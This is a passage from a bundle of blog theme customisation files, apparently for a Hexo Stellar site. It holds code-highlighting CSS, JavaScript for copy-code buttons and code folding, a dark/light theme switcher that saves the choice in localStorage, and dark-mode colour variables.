.hljs-ln::-webkit-scrollbar-thumb:hover { background: #ddd; } .hljs table tbody tr { border: none } .hljs .hljs-ln-line { padding: 1px 10px; border: none } td.hljs-ln-line.hljs-ln-numbers { border-right: 1px solid #666; } .hljs-keyword, .hljs-literal, .hljs-symbol, .hljs-name { color: #c78300 } .hljs-link { color: #569cd6; text-decoration: underline } .hljs-built_in, .hljs-type { color: #4ec9b0 } .hljs-number, .hljs-class { color: #2094f3 } .hljs-string, .hljs-meta-string { color: #4caf50 } .hljs-regexp, .hljs-template-tag { color: #9a5334 } .hljs-subst, .hljs-function, .hljs-title, .hljs-params, .hljs-formula { color: #c78300 } .hljs-property { color: #9c67a1; } .hljs-comment, .hljs-quote { color: #57a64a; font-style: italic } .hljs-doctag { color: #608b4e } .hljs-meta, .hljs-meta-keyword, .hljs-tag { color: #9b9b9b } .hljs-variable, .hljs-template-variable { color: #bd63c5 } .hljs-attr, .hljs-attribute, .hljs-builtin-name { color: #d34141 } .hljs-section { color: gold } .hljs-emphasis { font-style: italic } .hljs-strong { font-weight: bold } .hljs-bullet, .hljs-selector-tag, .hljs-selector-id, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo { color: #c78300 } .hljs-addition { background-color: #144212; display: inline-block; width: 100% } .hljs-deletion { background-color: #600; display: inline-block; width: 100% } .hljs.language-html::before, .hljs.language-xml::before { content: \"HTML/XML\" } .hljs.language-javascript::before { content: \"JavaScript\" } .hljs.language-c::before { content: \"C\" } .hljs.language-cpp::before { content: \"C++\" } .hljs.language-java::before { content: \"Java\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-actionscript::before { content: \"ActionScript/Flash/Flex\" } .hljs.language-bash::before { content: \"Bash\" } .hljs.language-css::before { content: \"CSS\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-cs::before, .hljs.language-csharp::before { content: \"C#\" } .hljs.language-d::before { content: \"D\" } .hljs.language-golang::before, .hljs.language-go::before { content: \"Go\" } .hljs.language-json::before { content: \"JSON\" } .hljs.language-lua::before { content: \"Lua\" } .hljs.language-less::before { content: \"LESS\" } .hljs.language-md::before, .hljs.language-markdown::before, .hljs.language-mkdown::before, .hljs.language-mkd::before { content: \"Markdown\" } .hljs.language-mm::before, .hljs.language-objc::before, .hljs.language-obj-c::before, .hljs.language-objective-c::before { content: \"Objective-C\" } .hljs.language-php::before { content: \"PHP\" } .hljs.language-perl::before, .hljs.language-pl::before, .hljs.language-pm::before { content: \"Perl\" } .hljs.language-python::before, .hljs.language-py::before, .hljs.language-gyp::before, .hljs.language-ipython::before { content: \"Python\" } .hljs.language-r::before { content: \"R\" } .hljs.language-ruby::before, .hljs.language-rb::before, .hljs.language-gemspec::before, .hljs.language-podspec::before, .hljs.language-thor::before, .hljs.language-irb::before { content: \"Ruby\" } .hljs.language-sql::before { content: \"SQL\" } .hljs.language-sh::before, .hljs.language-shell::before, .hljs.language-Session::before, .hljs.language-shellsession::before, .hljs.language-console::before { content: \"Shell\" } .hljs.language-swift::before { content: \"Swift\" } .hljs.language-vb::before { content: \"VB/VBScript\" } .hljs.language-yaml::before { content: \"YAML\" } /*stellar主题补偿*/ .md-text pre>.hljs { padding-top: 2rem !important; } .md-text pre { padding: 0 !important; } code { background-image: linear-gradient(90deg, rgba(60, 10, 30, .04) 3%, transparent 0), linear-gradient(1turn, rgba(60, 10, 30, .04) 3%, transparent 0) !important; background-size: 20px 20px !important; background-position: 50% !important; } figure::after { content: var(--code-autor); text-align: right; font-size: 10px; float: right; margin-top: 3px; padding-right: 15px; padding-bottom: 8px; color: #999 } figcaption span { border-radius: 0px 0px 12px 12px !important; } /* 复制代码按钮 */ .highlight { position: relative; } .highlight .code .copy-btn { position: absolute; top: 0; right: 0; padding: 4px 0.5rem; opacity: 0.25; font-weight: 700; color: var(--theme); cursor: pointer; transination: opacity 0.3s; } .highlight .code .copy-btn:hover { color: var(--text-code); opacity: 0.75; } .highlight .code .copy-btn.success { color: var(--swiper-theme-color); opacity: 0.75; } /* 描述 */ .md-text .highlight figcaption span { font-size: small; } /* 折叠 */ code.hljs { display: -webkit-box; overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; /*-webkit-line-clamp: 6;*/ padding: 1rem 1rem 0 1rem; /* chino建议 */ } .hljsOpen { -webkit-line-clamp: 99999 !important; } .CodeCloseDiv { color: #999; background: var(--block); display: flex; justify-content: center; margin-top: inherit; margin-bottom: -18px; } .CodeClose { color: #999; margin-top: 3px; background: var(--block); } .highlight button:hover, .highlight table:hover+button { color: var(--swiper-theme-color); opacity: 0.75; }"},{"path":"/custom/js/copycode.js","content":"window.codeElements.forEach((codeElement) => { // 创建复制按钮 const codeCopyBtn = document.createElement('div'); codeCopyBtn.className = 'copy-btn'; codeCopyBtn.textContent = ctx.copycode.default_text; codeElement.appendChild(codeCopyBtn); // 添加点击事件监听 codeCopyBtn.addEventListener('click', async () => { const codeToCopy = codeElement.querySelector('pre')?.innerText || ''; if (navigator.clipboard) { try { await navigator.clipboard.writeText(codeToCopy); codeCopyBtn.textContent = ctx.copycode.success_text; codeCopyBtn.classList.add('success'); hud.toast(ctx.copycode.toast, 2500); } catch (error) { codeCopyBtn.textContent = '未获得用户许可'; codeCopyBtn.classList.add('warning'); } } else { codeCopyBtn.textContent = '浏览器不支持/非HTTPS'; codeCopyBtn.classList.add('warning'); } // 3秒后恢复默认文本 setTimeout(() => { codeCopyBtn.textContent = ctx.copycode.default_text; codeCopyBtn.classList.remove('success', 'warning'); }, 3000); }); });"},{"path":"/custom/js/ZYCode.js","content":"// 这四个常量是复制,复制成功,展开,收缩 // 我使用的是 https://fontawesome.com/ 图标, 不用可以改为文字. const copyText = ''; const copySuccess = ''; const openText = ''; const closeText = ''; const codeElements = document.querySelectorAll('td.code'); codeElements.forEach((code, index) => { const preCode = code.querySelector('pre'); // 设置id和样式 preCode.id = `ZYCode${index+1}`; preCode.style.webkitLineClamp = '6'; // 添加展开/收起按钮 if (preCode.innerHTML.split('').length > 6) { const codeCopyDiv = document.createElement('div'); codeCopyDiv.classList.add('CodeCloseDiv'); code.parentNode.parentNode.parentNode.parentNode.appendChild(codeCopyDiv); const codeCopyOver = document.createElement('button'); codeCopyOver.classList.add('CodeClose'); codeCopyOver.innerHTML = openText; const parent = code.parentNode.parentNode.parentNode.parentNode; const description = parent.childNodes.length === 3 ? parent.children[2] : parent.children[1]; description.appendChild(codeCopyOver); codeCopyOver.addEventListener('click', () => { if (codeCopyOver.innerHTML === openText) { const scrollTop = document.documentElement.scrollTop; const codeHeight = code.clientHeight; if (scrollTop < codeHeight) { document.documentElement.scrollTop += codeHeight - scrollTop; } preCode.style.webkitLineClamp = '99999'; codeCopyOver.innerHTML = closeText; } else { preCode.style.webkitLineClamp = '6'; codeCopyOver.innerHTML = openText; } }); } // 添加复制按钮 const codeCopyBtn = document.createElement('div'); codeCopyBtn.classList.add('copy-btn'); codeCopyBtn.innerHTML = copyText; code.appendChild(codeCopyBtn); // 添加复制功能 codeCopyBtn.addEventListener('click', async () => { const currentCodeElement = code.querySelector('pre')?.innerText; await copyCode(currentCodeElement); codeCopyBtn.innerHTML = copySuccess; codeCopyBtn.classList.add('success'); setTimeout(() => { codeCopyBtn.innerHTML = copyText; codeCopyBtn.classList.remove('success'); }, 3000); }); }); async function copyCode(currentCode) { if (navigator.clipboard) { try { await navigator.clipboard.writeText(currentCode); } catch (error) { console.error(error); } } else { console.error('当前浏览器不支持此API'); } }"},{"path":"/custom/js/ZYDark.js","content":"/** * 监听系统主题 * @type {MediaQueryList} */ var OSTheme = window.matchMedia('(prefers-color-scheme: dark)'); OSTheme.addEventListener(e => { if (window.localStorage.getItem('ZYI_Theme_Mode') === 'Moss') { ThemeChange('Moss'); } }) /** * 修改博客主题 * @param theme 亮为light,暗为dark,自动为auto * @constructor */ const ThemeChange = (theme) => { if (theme === 'light' || (theme === 'Moss' && !OSTheme.matches)) { document.querySelector(\"html\").id = \"ZYLight\"; document.querySelector(\"#start > aside > footer > div > a:nth-child(6)\").style.filter= 'grayscale(0%)'; document.querySelector(\"#start > aside > footer > div > a:nth-child(5)\").style.filter= 'grayscale(100%)'; } else { document.querySelector(\"html\").id = \"ZYDark\"; document.querySelector(\"#start > aside > footer > div > a:nth-child(5)\").style.filter= 'grayscale(0%)'; document.querySelector(\"#start > aside > footer > div > a:nth-child(6)\").style.filter= 'grayscale(100%)'; } if (theme==='Moss'){document.querySelector(\"#start > aside > footer > div > a:nth-child(7)\").style.filter= 'grayscale(0%)';} else {document.querySelector(\"#start > aside > footer > div > a:nth-child(7)\").style.filter= 'grayscale(100%)';} window.localStorage.setItem('ZYI_Theme_Mode', theme); } /** * 初始化博客主题 */ switch (window.localStorage.getItem('ZYI_Theme_Mode')) { case 'light': ThemeChange('light'); break; case 'dark': ThemeChange('dark'); break; default: ThemeChange('Moss'); } /** * 切换主题模式 */ document.querySelector(\"#start > aside > footer > div > a:nth-child(5)\").onclick = () => { ThemeChange('dark'); } document.querySelector(\"#start > aside > footer > div > a:nth-child(6)\").onclick = () => { ThemeChange('light'); } document.querySelector(\"#start > aside > footer > div > a:nth-child(7)\").onclick = () => { ThemeChange('Moss'); }"},{"path":"/custom/css/ZYDark.css","content":"#ZYDark:root { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --text-p0: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #ff6333; } @media screen and (max-width: 667px) { #ZYDark:root { --site-bg: #000; } } #ZYDark:root { --blur-bg: rgba(0,0,0,0.5); } #ZYDark .float-panel { --blur-bg: rgba(0,0,0,0.4); } #ZYDark .tag-plugin.tag { --theme: #ff6333; --theme-bg1: #3d1e14; --theme-bg2: #2f2522; --theme-border: #5c2d1f; --text-p0: #ffc4b3; --text-p1: #dfae9f; --text-p2: #f1997e; } #ZYDark .tag-plugin[color='red'] { --theme: #f44336; --theme-bg1: #3d1714; --theme-bg2: #2f2322; --theme-border: #5c231f; --text-p0: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } #ZYDark .tag-plugin[color='orange'] { --theme: #fa6400; --theme-bg1: #3d2514; --theme-bg2: #2f2722; --theme-border: #5c371f; --text-p0: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } #ZYDark .tag-plugin[color='yellow'] { --theme: #ffbd2b; --theme-bg1: #3d3014; --theme-bg2: #2f2b22; --theme-border: #5c491f; --text-p0: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } #ZYDark .tag-plugin[color='green'] { --theme: #3dc550; --theme-bg1: #143d1a; --theme-bg2: #222f24; --theme-border: #1f5c27; --text-p0: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } #ZYDark .tag-plugin[color='cyan'] { --theme: #1bcdfc; --theme-bg1: #14353d; --theme-bg2: #222d2f; --theme-border: #1f4f5c; --text-p0: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } #ZYDark .tag-plugin[color='blue'] { --theme: #2196f3; --theme-bg1: #142b3d; --theme-bg2: #222a2f; --theme-border: #1f415c; --text-p0: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } #ZYDark .tag-plugin[color='purple'] { --theme: #9c27b0; --theme-bg1: #37143d; --theme-bg2: #2d222f; --theme-border: #531f5c; --text-p0: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } #ZYDark .tag-plugin[color='light'] { --theme-border: #fff; --theme-bg1: #e0e0e0; --theme-bg2: #fff; --text-p0: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } #ZYDark .tag-plugin[color='dark'] { --theme-border: #000; --theme-bg1: #1f1f1f; --theme-bg2: #111; --text-p0: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } #ZYDark .tag-plugin[color='warning'], #ZYDark .tag-plugin[color='light'] { --text-p0: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } #ZYDark .social-wrap a.social:hover { box-shadow: none; } /* waline评论样式 */ #ZYDark .wl-count{ padding: .375em; font-weight: bold; font-size: 1.25em; color: #fff; } #ZYDark .cmt-body.waline{ --waline-white: #000; --waline-light-grey: #666; --waline-dark-grey: #999; /* 布局颜色 */ --waline-color: #fff; --waline-bgcolor: var(--block); --waline-bgcolor-light: #272727; --waline-border-color: #333; --waline-disable-bgcolor: #444; --waline-disable-color: #272727; /* 特殊颜色 */ --waline-bq-color: #272727; /* 其他颜色 */ --waline-info-bgcolor: #272727; --waline-info-color: #666; }"}]